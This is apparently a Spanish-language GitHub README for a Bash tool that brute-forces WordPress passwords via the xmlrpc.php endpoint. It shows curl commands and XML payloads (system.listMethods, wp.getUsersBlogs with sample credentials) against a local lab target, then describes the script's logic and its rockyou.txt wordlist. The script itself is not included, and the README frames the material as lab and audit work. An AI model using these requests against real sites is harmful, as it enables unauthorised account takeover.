 # Identificación del endpoint XML-RPC
 ## Antes de lanzar el ataque comprobar si es posible hacerlo mediante este script

1. Primero vemos si esta expuesto el archivo xmlrpc  buscando los siguiente `URL/xmlrpc.php`  

```jsx
http://127.0.0.1:31337/xmlrpc.php
```

  <img width="1207" height="116" alt="image" src="https://github.com/user-attachments/assets/60818058-99d7-45fc-ba56-9406eeca5eae" />

2. Si observamos el mensaje de la pagina vemos que dice que solo acepta peticiones por post 
  <img width="1066" height="160" alt="image" src="https://github.com/user-attachments/assets/b15e0160-607b-43d0-8913-120b4778f048" />



3. Le enviamos una petición por post 

```jsx
 curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php"
```

4. Verificamos lo que nos ha mandado el servidor , y vemos que dice que la peticion no esta bien formada 

  <img width="658" height="330" alt="image" src="https://github.com/user-attachments/assets/01873f59-6f87-45ff-a3d3-ee5a47fc9115" />


5. Intentamos averiguar que peticiones acepta el servidor , para ello le enviamos una péticion por post con un archivo con extensión  `.xml`   con el siguiente contenido 

```jsx
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>

```

6. Hacemos la petición post enviando el archivo 

```jsx
curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file_V1.xml
```

7. De la lista de métodos  que tiene disponibles  vemos uno que dice  `getUsersBlogs`  , este es el método que usaremos para el ataque   

  <img width="490" height="567" alt="image" src="https://github.com/user-attachments/assets/b51a9af1-9137-44c3-b85a-afe1e0e48960" />


8.. Volvemos a enviar una petición por POST  mediante un archivo `xml` pero esta vez el contenido será el del método  que hemos mencionado en el apartado anterior 

```jsx
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>s4vitar</value></param>
    <param><value>louise</value></param>
  </params>
</methodCall>

```

9.. Nuevamente enviamos el archivo por petición  POST  y vemos que nos `Incorrect username or password.`  por lo que ahora con un script podemos realizar fuerza bruta 

```jsx
curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file_v2.xml
```

10. Como Wordpress responde hemos comprobado que wordpress responde a la peticiones estamos listos para lanzar el script


# Script Para hacer Fuerza bruta a wordpress
Repositorio que contiene un script Bash para realizar ataques de fuerza bruta contra WordPress mediante XML-RPC, utilizando el método `wp.getUsersBlogs`. Pensado para auditorías de seguridad y laboratorios de ciberseguridad.

---

# Propósito
Este proyecto demuestra cómo explotar el endpoint `xmlrpc.php` de WordPress para validar credenciales mediante peticiones XML-RPC. El script automatiza el proceso de prueba de contraseñas usando un diccionario, con el objetivo de evaluar la robustez de las credenciales de un usuario.

Repositorio orientado a reclutadores y equipos técnicos como muestra de conocimientos en:
- Pentesting web
- Automatización en Bash
- Análisis de servicios WordPress
- Ataques de autenticación

---

# Descripción detallada del script

## `wp_xmlrpc_bruteforce.sh`

### Función
Ejecuta un ataque de fuerza bruta contra un sitio WordPress enviando peticiones POST al endpoint `xmlrpc.php` usando el método `wp.getUsersBlogs`. Cada intento prueba una contraseña distinta para un usuario específico.

---

## Funcionamiento interno

### `createXML`
- Genera dinámicamente un archivo XML con el usuario y la contraseña.
- Envía la petición mediante `curl`.
- Analiza la respuesta del servidor.
- Detecta éxito cuando no aparecen mensajes de error conocidos.
- Detiene el script al encontrar una contraseña válida.

### Control de señales
- Captura `CTRL+C` para finalizar el proceso limpiamente.

---

# Requisitos
- `bash`
- `curl`
- Acceso al endpoint `xmlrpc.php`
- Diccionario de contraseñas (`rockyou.txt`)
  - Ruta por defecto: `/usr/share/wordlists/rockyou.txt`
- Conectividad de red con el objetivo

---


